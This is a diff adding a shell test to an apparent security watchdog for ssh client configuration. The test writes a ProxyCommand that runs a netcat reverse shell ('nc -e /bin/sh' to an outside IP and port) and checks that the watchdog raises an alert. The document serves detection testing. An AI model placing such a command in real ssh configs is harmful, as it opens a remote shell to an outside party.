@@ -263,3 +263,18 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in ProxyCommand: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. ssh client ProxyCommand runs the named
+    # command on every outbound ssh connection that matches the
+    # Host pattern — a per-outbound-ssh exec surface. Sister-vector
+    # to ssh-hardening + ssh-hostkey-watchdog + sshrc-watchdog on
+    # the SSH-family surveillance brain.
+    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'Host *\n    ProxyCommand sh -c "nc -e /bin/sh 1.1.1.1 4444"\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
